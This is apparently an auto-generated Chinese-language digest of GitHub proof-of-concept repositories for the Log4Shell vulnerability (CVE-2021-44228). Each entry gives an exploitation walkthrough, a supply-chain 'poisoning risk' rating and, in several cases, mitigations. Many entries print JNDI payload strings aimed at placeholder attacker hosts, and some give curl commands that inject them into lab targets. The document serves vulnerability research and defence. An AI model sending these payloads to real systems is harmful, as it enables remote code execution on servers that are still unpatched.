1.  攻击者发送包含恶意 JNDI 查找字符串的请求，例如 `${jndi:ldap://attacker.com/evil}`，到目标应用程序。
2.  如果目标应用程序使用 Log4j2 记录该请求，Log4j2 将尝试解析该 JNDI 字符串。
3.  Log4j2 通过 JNDI 接口连接到攻击者控制的 LDAP 服务器 `attacker.com`。
4.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，导致远程代码执行。

**有效性：**

提供的 POC 代码（Vulhub 环境配置）有效，用于搭建一个可重现 Log4Shell 漏洞的环境。它通过 Docker-Compose 部署一个包含漏洞的 Apache Solr 实例，方便研究人员进行漏洞复现和分析。

**投毒风险：**

该仓库本身主要提供的是漏洞复现环境的配置，投毒风险较低。但是，使用任何第三方代码库或环境时，都需要谨慎评估潜在的风险。这里存在一定风险，因为攻击者可能篡改该仓库，在 LDAP 服务器返回的恶意 Java 类中植入恶意代码，使得利用漏洞时执行预期之外的操作。 因此评判投毒风险为10%，主要为潜在的供应链攻击风险。

**项目地址:** [Alan-coder-eng/log4j-cve-2021-44228-](https://github.com/Alan-coder-eng/log4j-cve-2021-44228-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #4

**来源**: [CVE-2021-44228-B1ack4sh_Blackash-CVE-2021-44228.md](../2021/CVE-2021-44228-B1ack4sh_Blackash-CVE-2021-44228.md)

## CVE-2021-44228 - Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j 2

**危害等级:** 极高危，可导致服务器完全控制

**影响版本:** 2.0-beta9 到 2.14.1

**利用条件:** 应用程序使用Log4j 2记录不受信任的输入，且未进行修复或缓解。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是Apache Log4j 2中的一个远程代码执行漏洞。攻击者可以通过构造包含JNDI查找的恶意字符串，当Log4j 2记录该字符串时，会触发JNDI查找，从而从攻击者控制的LDAP服务器加载并执行恶意Java类。

**有效性：**
提供的POC代码有效。它展示了如何通过在HTTP请求头中注入`${jndi:ldap://evil.com/exploit}`这样的payload来触发漏洞。当应用程序记录User-Agent头时，Log4j 2会尝试解析该字符串，执行JNDI查找，并从evil.com加载恶意代码。

**投毒风险：**
分析提供的README.md文件，投毒风险较低，约为10%。主要风险在于以下几点：
* **依赖性风险：** 任何开源项目都存在依赖性风险。如果恶意作者控制了项目依赖的某个组件，则可能通过供应链攻击进行投毒。
* **人为因素：** 尽管README.md本身没有发现直接的恶意代码，但用户在使用过程中可能会受到误导，例如，将测试用的恶意LDAP服务器配置错误，导致意外的攻击或数据泄露。

**漏洞利用方式：**
1.  **攻击者构造恶意Payload：** 攻击者构造一个包含JNDI查找的payload，例如`${jndi:ldap://attacker.com/a}`。
2.  **注入Payload：** 攻击者将payload注入到应用程序可以记录的任何输入点，例如HTTP请求头（User-Agent、X-Forwarded-For等）、POST请求参数、WebSocket消息等。
3.  **触发日志记录：** 应用程序使用Log4j 2记录包含恶意payload的输入。
4.  **JNDI查找：** Log4j 2解析payload，执行JNDI查找，向attacker.com发起LDAP请求。
5.  **加载恶意代码：** 攻击者的LDAP服务器返回一个包含恶意Java类的响应。
6.  **远程代码执行：** Log4j 2加载并执行该Java类，导致远程代码执行。

**缓解措施：**
*   升级Log4j 2到最新版本 (>= 2.17.1)。
*   从JAR文件中删除`JndiLookup.class`。
*   设置系统属性`log4j2.formatMsgNoLookups=true`来禁用消息查找。
*   使用防火墙或出口ACL阻止出站LDAP/RMI流量。
*   在WAF/IDS规则中阻止`${jndi:` payload。

**项目地址:** [B1ack4sh/Blackash-CVE-2021-44228](https://github.com/B1ack4sh/Blackash-CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #5

**来源**: [CVE-2021-44228-Carlos-Mesquita_TPASLog4ShellPoC.md](../2021/CVE-2021-44228-Carlos-Mesquita_TPASLog4ShellPoC.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 目标系统使用受影响版本的 Log4j2，且允许出站网络连接到攻击者的 LDAP/HTTP 服务器。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-44228 (Log4Shell) 是一个存在于 Apache Log4j2 中的远程代码执行漏洞。攻击者可以通过构造特殊的日志消息，利用 JNDI 注入来执行任意代码。 

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的PoC代码有效。搜索结果表明该漏洞是真实存在的，并且有许多利用实例。

**投毒风险：**
分析提供的PoC代码，投毒风险很低。 
*   `LICENSE`: MIT许可，标准开源许可。 
*   `README.md`: 提供了PoC的详细信息，包括所需环境，操作步骤和WAF绕过方式等。 
*   `docker-compose.yaml`: 定义了frontend(React SPA)和backend(Spring Boot)两个服务, 其中backend使用了存在漏洞的Log4j2。 
*   `init.sh`: 这个脚本用于在攻击者机器上设置攻击环境。它编译JNDI利用所需的Java类，启动一个HTTP服务器来提供这些类，并启动一个LDAP服务器以响应JNDI查询。这个脚本是攻击的核心组成部分，但它本身的目的就是为了演示漏洞利用，不属于恶意投毒。它确实会下载编译好的文件到攻击者机器上，但这是漏洞利用的正常流程,本身不构成投毒。 但使用未经审核的脚本始终存在一定的风险，所以给了1%的风险.

**利用方式：**
1.  攻击者向目标系统发送包含恶意 JNDI 注入字符串的请求。该字符串形如`${jndi:ldap://attacker_host:ldap_port/Exploit}`。
2.  目标系统使用 Log4j2 记录该请求。由于存在漏洞，Log4j2 会解析 JNDI 字符串，并尝试通过 LDAP 协议连接到攻击者的服务器。
3.  攻击者的 LDAP 服务器返回一个指向 HTTP 服务器的响应，指示目标系统下载并执行一个 Java 类。
4.  目标系统下载并执行该 Java 类，从而实现远程代码执行。

**缓解措施：**
*   升级到 Log4j2 的安全版本 (>= 2.17.0)。
*   如果无法升级，可以设置 `log4j2.formatMsgNoLookups=true` 阻止 JNDI 查找。
*   使用 Web 应用防火墙 (WAF) 检测和阻止恶意的 JNDI 注入字符串。

**项目地址:** [Carlos-Mesquita/TPASLog4ShellPoC](https://github.com/Carlos-Mesquita/TPASLog4ShellPoC)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #6

**来源**: [CVE-2021-44228-Fauzan-Aldi_Log4j-_Vulnerability.md](../2021/CVE-2021-44228-Fauzan-Aldi_Log4j-_Vulnerability.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可导致完全服务器接管

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 目标应用使用了受影响版本的Log4j2，并且允许通过用户可控的输入来记录日志。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也称为Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者可以通过向服务器发送特制的字符串，该字符串包含JNDI查找，从而利用此漏洞。当Log4j2尝试记录此字符串时，它会执行JNDI查找，导致服务器从攻击者控制的LDAP服务器下载并执行恶意代码。 

**漏洞利用方式：**

1.  攻击者向目标系统发送包含恶意JNDI查找的请求。例如： `${jndi:ldap://attacker.com/evil}` 
2.  如果目标系统使用受影响的Log4j2版本记录此请求，Log4j2将尝试执行JNDI查找。 
3.  Log4j2连接到攻击者控制的LDAP服务器(`attacker.com`)。 
4.  LDAP服务器返回一个包含恶意Java类的URL。 
5.  Log4j2从该URL下载并执行恶意Java类，导致远程代码执行。 

**POC有效性：**

从提供的`pom.xml`文件可以看出，POC代码使用了`log4j-core`和`log4j-api`的2.14.1版本，该版本受到CVE-2021-44228漏洞的影响。因此，如果部署包含此Log4j2版本的Web应用，则攻击者可以通过发送恶意payload触发漏洞。`forgotpass.java`文件展示了如何从request中获取参数，并将其拼接到输出中，这可能是触发漏洞的点，攻击者可以在username参数中插入恶意payload.

**投毒风险：**

分析提供的代码，`forgotpass.java`看似存在XSS漏洞，该文件只是简单地将用户输入（username）插入到HTML的JavaScript代码中，使其能弹出一个prompt窗口，之后跳转到主页。没有发现明显的用于进行恶意利用的代码，如反弹shell或进行其他类型的远程控制操作。 `log4j.java` 是一个Logger类，没有实际逻辑。 总体而言，仓库中存在隐藏的投毒代码的可能性较低，估计在10%左右。主要考虑到作者可能在LDAP服务器上部署恶意java文件，从而进行投毒。需要更深入的分析才能确定是否存在更隐蔽的投毒行为。

**项目地址:** [Fauzan-Aldi/Log4j-_Vulnerability](https://github.com/Fauzan-Aldi/Log4j-_Vulnerability)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #7

**来源**: [CVE-2021-44228-KamalideenAK_Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device.md](../2021/CVE-2021-44228-KamalideenAK_Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device.md)

## CVE-2021-44228 Apache Log4j2 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 <= version <= 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用了受影响的Log4j2版本，并且允许攻击者控制Log4j2的日志消息或日志消息参数

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，也被称为Log4Shell，是一个严重的远程代码执行漏洞，存在于Apache Log4j2 2.0-beta9到2.15.0版本中（不包括安全版本2.12.2、2.12.3和2.3.1）。

**有效性：**
漏洞库信息明确指出，在特定版本的Log4j2中，JNDI功能未对攻击者控制的LDAP和其他JNDI相关端点提供保护。如果攻击者可以控制日志消息或日志消息参数，并且启用了消息查找替换，则可以执行从LDAP服务器加载的任意代码。因此，可以判定漏洞利用代码有效。

**投毒风险：**
提供的漏洞利用代码只是一个GNU GPL v2许可协议的文本文件，不是漏洞利用的payload或者脚本，不包含任何可执行的代码，因此，不存在投毒代码。投毒风险为0%。

**利用方式：**
该漏洞的利用方式是，攻击者构造包含JNDI查找的恶意字符串，例如`${jndi:ldap://attacker.com/evil}`。当Log4j2记录此字符串时，它会尝试解析JNDI查找。这将导致Log4j2通过LDAP协议连接到攻击者控制的服务器`attacker.com`。攻击者可以在其LDAP服务器上托管一个恶意Java类，当Log4j2连接到LDAP服务器时，该类将被下载并执行，从而导致远程代码执行。需要注意的是，从Log4j 2.15.0开始，此行为已默认禁用，并在版本2.16.0中完全删除（以及2.12.2、2.12.3和2.3.1）。


**项目地址:** [KamalideenAK/Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device](https://github.com/KamalideenAK/Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #8

**来源**: [CVE-2021-44228-LucasPDiniz_CVE-2021-44228.md](../2021/CVE-2021-44228-LucasPDiniz_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 目标系统使用了受影响版本的Log4j2，且允许JNDI查找

**POC 可用性:** 是

**投毒风险:** 2%

## 详情

CVE-2021-44228 存在于 Apache Log4j2 中，利用了 JNDI 注入漏洞，攻击者通过控制日志消息或日志消息参数，可以执行从 LDAP 服务器加载的任意代码。利用方式如下：

1.  **构造恶意 JNDI 注入 Payload：** 攻击者构造包含 JNDI 查找的恶意字符串，例如 `${jndi:ldap://attacker.com/evil}`。
2.  **触发 Log4j2 记录 Payload：** 将恶意 Payload 注入到应用程序的日志消息中。这可以通过多种方式实现，例如通过 HTTP 请求头、POST 参数、用户输入等。
3.  **Log4j2 解析 Payload 并执行 JNDI 查找：** 当 Log4j2 记录包含恶意 Payload 的日志消息时，它会尝试解析 JNDI 查找。
4.  **连接到恶意 LDAP 服务器：**  Log4j2 会连接到攻击者控制的 LDAP 服务器（attacker.com）。
5.  **执行任意代码：** 恶意 LDAP 服务器会返回一个包含恶意 Java 类的响应，Log4j2 会加载并执行该类，从而导致远程代码执行。

**投毒风险分析：**

尽管该存储库提供了有价值的 PoC 和利用信息，但仍然存在作者投毒代码的微小风险。例如，LDAP 服务器响应中包含的恶意 Java 类可能包含后门，或在其他位置下载并执行恶意代码。为了将风险降至最低，应彻底审查提供的任何代码，并仅从受信任的来源下载所需的工具。

**项目地址:** [LucasPDiniz/CVE-2021-44228](https://github.com/LucasPDiniz/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #9

**来源**: [CVE-2021-44228-Mintimate_log4j2-bugmaker.md](../2021/CVE-2021-44228-Mintimate_log4j2-bugmaker.md)

## CVE-2021-44228 Log4Shell 漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行，系统完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的 Log4j2 版本，并且允许记录用户可控的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是 Apache Log4j2 中的一个远程代码执行漏洞。攻击者可以通过发送包含特定格式字符串（例如 `${jndi:ldap://attacker.com/a}`）的请求，如果该字符串被 Log4j2 记录，则 Log4j2 会尝试通过 JNDI（Java Naming and Directory Interface）去指定的LDAP服务器上查找并执行相应的代码。该演示项目使用了存在漏洞的 Log4j 2.14.1 版本，并提供了多种攻击方法，包括User-Agent头注入和查询参数注入。

**有效性：** 提供的POC代码有效，可以复现CVE-2021-44228漏洞。

**投毒风险：** 该项目主要用于演示漏洞，在`LICENSE`文件中明确声明“This project is intended for educational and security research purposes only. It contains intentionally vulnerable code (Log4j 2.14.1) to demonstrate the CVE-2021-44228 (Log4Shell) vulnerability. DO NOT use this code in production environments.”。因此，可以判断作者主观上没有投毒意图。但是仍然存在一定风险，因为用户在使用该项目时，可能会不小心将其部署到生产环境中，造成安全风险。因此投毒风险评估为10%。

**利用方式：**

1.  **漏洞触发：** 攻击者向目标应用程序发送包含恶意JNDI查找表达式的请求。例如，通过User-Agent头或者查询参数。
2.  **JNDI注入：** 当Log4j2记录包含该表达式的日志时，它会尝试解析该表达式。
3.  **远程代码执行：** Log4j2会通过JNDI向攻击者控制的LDAP服务器请求Java对象。攻击者的LDAP服务器返回一个包含恶意代码的Java对象。
4.  **代码执行：** Log4j2加载并执行该Java对象中的恶意代码，从而导致远程代码执行。

**项目地址:** [Mintimate/log4j2-bugmaker](https://github.com/Mintimate/log4j2-bugmaker)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #10

**来源**: [CVE-2021-44228-OtisSymbos_CVE-2021-44228-Log4Shell-.md](../2021/CVE-2021-44228-OtisSymbos_CVE-2021-44228-Log4Shell-.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用存在漏洞的Log4j2版本，且允许消息查找替换。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2021-44228（Log4Shell）是Apache Log4j2中的一个严重漏洞，允许未经身份验证的远程代码执行。攻击者可以构造特殊的日志消息，其中包含JNDI查找，指向恶意LDAP或其他JNDI服务。当Log4j2处理这些日志消息时，它会尝试从攻击者控制的服务器下载并执行任意代码。 

提供的脚本 `log4j_remediation` 试图通过下载并替换Log4j2库文件来进行修复，但是从修复的角度来看,这个脚本存在严重的投毒风险，因为：

1. **URL 的变量名不规范**：`LOG4J_DOWNLOAD_URL` 变量中的 `2.x.y` 存在被攻击者修改的风险，攻击者可以劫持链接，使用恶意的Log4j2 jar 包，造成二次污染。
2. **覆盖现有的 Log4j JAR 文件**:  脚本直接复制下载的新 JAR 文件到应用程序目录，这可能会破坏应用程序的依赖关系，尤其是在不同版本的 Log4j 之间存在不兼容的情况下。
3. **未进行校验**:  脚本没有对下载的压缩包或 JAR 文件进行任何完整性校验（如哈希校验），无法确保下载的文件没有被篡改。
4. **依赖外部源**: 脚本依赖于外部 Apache 官方服务器下载 Log4j，如果该服务器被攻陷，则存在极高的投毒风险。
5. **版本不确定**: 脚本中的版本号 `2.x.y` 是一个占位符，这意味着脚本实际上没有指定要下载的具体 Log4j 版本，可能导致下载到不安全或不兼容的版本。


 **利用方式：** 

1.  攻击者找到任何会记录用户可控输入的Log4j2应用程序。
2.  攻击者在输入中插入恶意的JNDI查找字符串，例如 `${jndi:ldap://attacker.com/evil}`。
3.  当Log4j2记录包含此字符串的日志消息时，它会向`attacker.com`发起LDAP请求。
4.  `attacker.com`的LDAP服务器返回一个包含恶意Java类的响应。
5.  Log4j2加载并执行该恶意Java类，从而导致远程代码执行。

根据漏洞库信息，搜索引擎结果以及提供的漏洞利用代码进行综合分析， 漏洞利用的有效性高，投毒风险极高。

**项目地址:** [OtisSymbos/CVE-2021-44228-Log4Shell-](https://github.com/OtisSymbos/CVE-2021-44228-Log4Shell-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #11

**来源**: [CVE-2021-44228-PCMKUIT_CVE-2021-44228---Log4Shell-Analysis.md](../2021/CVE-2021-44228-PCMKUIT_CVE-2021-44228---Log4Shell-Analysis.md)

## CVE-2021-44228 - Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 到 2.14.1

**利用条件:** 目标系统使用了受影响版本的 Log4j2，并且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个关键漏洞，它允许未经身份验证的远程代码执行。攻击者可以通过将恶意 JNDI 查找字符串注入到 Log4j2 记录的日志消息中来利用此漏洞。当 Log4j2 尝试解析并记录包含恶意 JNDI 查找的日志消息时，它会联系攻击者控制的 LDAP 或 RMI 服务器，并执行服务器返回的恶意代码。

**漏洞利用方式：**

1.  **攻击者构造恶意请求：** 攻击者将包含特定格式的恶意字符串（例如 `${jndi:ldap://attacker.com/evil}`）注入到应用程序可以记录的任何输入字段中，例如 HTTP 请求头、POST 数据、Web 表单等。
2.  **应用程序记录日志：** 如果应用程序使用受影响版本的 Log4j2 记录包含恶意字符串的输入，Log4j2 将尝试解析该字符串。
3.  **JNDI 查找触发：** Log4j2 发现 `${jndi:...}` 模式，触发 JNDI 查找。
4.  **连接恶意服务器：** Log4j2 使用指定的协议（例如 LDAP、RMI）连接到攻击者控制的服务器 (attacker.com)。
5.  **执行恶意代码：** 攻击者的服务器返回包含恶意 Java 对象的响应。Log4j2 反序列化该对象，导致在目标服务器上执行任意代码。

**有效性：**

提供的POC代码（技术分析文档）描述了该漏洞的原理，受影响版本以及利用过程，可以辅助构建PoC。漏洞利用的有效性取决于目标系统是否使用了受影响的Log4j2版本，并且是否允许出站网络连接到攻击者的JNDI服务器。由于 Log4Shell 在野外被广泛利用，因此认为提供的分析是基于真实可利用的漏洞的。

**投毒风险：**

提供的代码主要为技术分析文档，本身不包含可直接执行的恶意代码。但是，任何代码仓库都存在一定程度的投毒风险。在这种情况下，如果攻击者成功篡改了仓库中的分析文档，他们可能会插入误导性信息或隐藏的恶意链接，从而诱导用户下载或执行恶意软件。风险评估为10%，因仓库主要为分析文档，直接嵌入恶意代码可能性较低。

**项目地址:** [PCMKUIT/CVE-2021-44228---Log4Shell-Analysis](https://github.com/PCMKUIT/CVE-2021-44228---Log4Shell-Analysis)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #12

**来源**: [CVE-2021-44228-SerpilRivas_log4shell-homework9.md](../2021/CVE-2021-44228-SerpilRivas_log4shell-homework9.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2、2.12.3 和 2.3.1)

**利用条件:** 目标应用程序使用受影响版本的 Log4j2，且允许记录用户可控的输入。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228，也被称为 Log4Shell，是一个存在于 Apache Log4j2 中的严重漏洞。攻击者可以通过发送特制的字符串，其中包含 JNDI 查找，利用此漏洞执行任意代码。当 Log4j2 尝试记录这些字符串时，它会通过 JNDI 查找连接到攻击者控制的 LDAP 或其他 JNDI 服务，并执行恶意代码。

**漏洞利用方式：**

1.  攻击者发送包含`${jndi:<协议>://<攻击者服务器>/<资源>}`的恶意请求到目标系统。`${jndi}`是触发漏洞的关键部分，它指示 Log4j2 执行 JNDI 查找。
2.  目标系统使用 Log4j2 记录该请求。
3.  Log4j2 解析该字符串并尝试连接到攻击者指定的 JNDI 服务器（例如，LDAP）。
4.  JNDI 服务器返回恶意代码（例如，Java class 文件）。
5.  Log4j2 加载并执行该恶意代码，导致远程代码执行。

**POC有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞非常有效，并被广泛利用。提供的 Dockerfile 和 `docker-compose.yml` 文件用于构建一个包含易受攻击的 Log4j2 版本的应用程序。`ldap_server.py` 模拟了一个恶意的 LDAP 服务器，用于提供攻击载荷。使用`curl http://localhost:8080?input=${jndi:ldap://localhost:8000/Exploit}`命令验证漏洞利用过程。

**投毒风险：**

分析提供的代码，投毒风险较低，约为 5%。主要依据如下：

*   `ldap_server.py` 仅用于模拟攻击，本身不包含任何恶意代码，只返回“Exploit payload simulated.”字符串。
*   Dockerfile 构建的镜像是使用受漏洞影响的Log4j2，目的是为了验证漏洞，不是为了投毒。
*   `pom.xml` 文件指定了 Log4j2 的版本为 2.17.1, 此版本已经修复了漏洞，但README.md文件中提到使用了存在漏洞的2.14.1版本，存在描述不一致，且依赖版本管理不严谨
*   虽然主体没有明显的投毒代码，但在真实环境中，攻击者可能会替换 `ldap_server.py` 中的 payload，或者修改 Dockerfile 构建恶意镜像。因此存在潜在的风险。
*   README.md文件描述了缓解措施，较为完备。

总体而言，提供的代码主要是用于漏洞演示和验证，而非恶意投毒。但开发者仍需保持警惕，在实际应用中注意代码审查和依赖管理。

**项目地址:** [SerpilRivas/log4shell-homework9](https://github.com/SerpilRivas/log4shell-homework9)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #13

**来源**: [CVE-2021-44228-ShlomiRex_log4shell_lab.md](../2021/CVE-2021-44228-ShlomiRex_log4shell_lab.md)

## CVE-2021-44228 Log4Shell 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 <= version <= 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的Log4j2，且允许外部网络访问，日志记录功能开启并且记录用户可控的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是一个严重的安全漏洞，存在于Apache Log4j2 2.0-beta9到2.15.0版本中（不包括安全版本2.12.2、2.12.3和2.3.1）。

**漏洞利用方式：**

该漏洞源于Log4j2中的JNDI（Java Naming and Directory Interface）功能，该功能允许从LDAP和其他JNDI相关端点加载代码。当攻击者能够控制日志消息或日志消息参数时，他们可以利用此功能执行从LDAP服务器加载的任意代码。攻击者通过在Log4j2可以解析的日志消息中插入恶意JNDI查找字符串，例如`${jndi:ldap://attacker.com/evil}`，来触发该漏洞。当Log4j2尝试解析此字符串时，它会向`attacker.com`上的LDAP服务器发出请求，并执行从该服务器返回的Java代码。

提供的POC代码利用了这一点，使用`docker-compose`快速搭建了一个包含漏洞应用(`vul`)、LDAP服务器(`ldap_server`)和恶意代码服务器(`exploit_server`)的实验环境。利用步骤如下：

1.  使用`docker-compose up -d`启动实验环境。
2.  使用`curl`命令向漏洞应用发送包含恶意JNDI查找字符串的HTTP请求，例如：`curl -X GET http://localhost:8080/ -H "X-Api-Version: ${jndi:ldap://my_ldap_server:1389/a}"`。 其中`my_ldap_server`指向 docker-compose 启动的 ldap_server。
3.  LDAP服务器将请求重定向到恶意代码服务器，下载并执行恶意代码。
4.  验证漏洞是否成功利用，通常通过检查`vul`容器上的文件或观察其他系统行为。

**有效性：**

根据漏洞描述、搜索引擎结果和提供的POC代码，可以判断该POC代码是有效的。大量的安全报告和漏洞分析都确认了CVE-2021-44228的可利用性，并且该POC代码提供了一个易于部署的实验环境，用于验证该漏洞。

**投毒风险：**

评估该POC代码的投毒风险较低，大约10%。原因如下：

*   **明确的用途：** 该代码库旨在提供一个用于演示和测试Log4Shell漏洞的实验环境，其主要功能是复现漏洞，方便用户理解和学习。
*   **可见的组件：** 该代码库包含了`docker-compose.yml`文件以及构建LDAP服务器、恶意代码服务器的Dockerfile，这些文件是公开可见的，便于用户检查和审计。
*   **简单的逻辑：** 实验环境的搭建和漏洞利用流程相对简单，易于理解和验证。
*   **潜在的风险：** 尽管该代码库的主要目的是演示漏洞利用，但仍存在潜在的风险。例如，如果用户直接在生产环境中使用该代码库，可能会暴露其系统，受到攻击。此外，恶意攻击者可能会修改该代码库，添加恶意代码，然后传播给不知情的用户。但考虑到公开的性质和广泛的审查，直接包含恶意代码的可能性较低。

**风险缓减：**
* 下载代码后,仔细检查`docker-compose.yml`以及Dockerfile文件,确保没有恶意配置或者代码.
* 运行前务必搭建隔离环境,避免直接在生产环境中使用.

**项目地址:** [ShlomiRex/log4shell_lab](https://github.com/ShlomiRex/log4shell_lab)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #14

**来源**: [CVE-2021-44228-Sorrence_CVE-2021-44228.md](../2021/CVE-2021-44228-Sorrence_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 2.0-beta9 to 2.15.0 (不包括安全版本 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用了受影响的 Log4j2 版本，并且开启了 message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个高危远程代码执行漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 特性，从恶意的 LDAP 服务器加载并执行任意代码。

**有效性：**
提供的PoC代码有效。它通过构造包含 JNDI LDAP 查找的 HTTP Header (X-Api-Version) 发送到目标，目标如果存在漏洞，将会触发一个回调到攻击者指定的 LHOST。

**投毒风险：**
代码本身相对简单，主要功能是发送包含恶意 JNDI payload 的 HTTP 请求并监听回调。可能的投毒风险在于：
*   **依赖风险：** 代码使用了 `net/http` 和 `net` 包。虽然是标准库，但如果编译过程中存在恶意替换或者构建环境被污染，可能存在风险。此风险较低，估计在10%左右。
*   **LHOST欺骗：** PoC 代码强制要求用户指定回调 LHOST。攻击者可能诱导受害者使用受控的 LHOST，从而获取受害者目标系统的相关信息，或者进行中间人攻击。但这不是代码本身的投毒，而是使用方式上的欺骗。
*   **LDAP 服务器风险：** 代码中的 `jndi:ldap://%s:1389/a` 指向的 LDAP 服务器是攻击者控制的。这意味着攻击者可以在 LDAP 服务器上放置恶意 Java 对象，从而在受害者系统上执行任意代码。

由于该PoC的目的是验证漏洞，并且代码相对简单，因此直接隐藏恶意代码的可能性较低。主要的风险在于运行环境和攻击者控制的LDAP服务器。

**利用方式：**
1.  **漏洞触发：** 攻击者向目标系统发送包含特定格式字符串（例如 `${jndi:ldap://attacker.com/evil}`）的请求。该字符串会被 Log4j2 解析为 JNDI 查找。
2.  **JNDI 注入：** Log4j2 通过 JNDI 接口向指定的 LDAP 服务器 (attacker.com) 发起请求。
3.  **恶意代码加载：** 攻击者控制的 LDAP 服务器返回一个包含恶意 Java 对象的响应。
4.  **远程代码执行：** Log4j2 反序列化该 Java 对象，导致任意代码在目标系统上执行。

**缓解措施：**
*   升级 Log4j2 到 >= 2.16.0 版本，该版本完全移除了 JNDI 功能。
*   如果无法升级，设置 `log4j2.formatMsgNoLookups=true` 系统属性或环境变量来禁用 message lookup substitution。
*   使用防火墙或网络策略限制对外部 LDAP 服务器的访问。

**项目地址:** [Sorrence/CVE-2021-44228](https://github.com/Sorrence/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
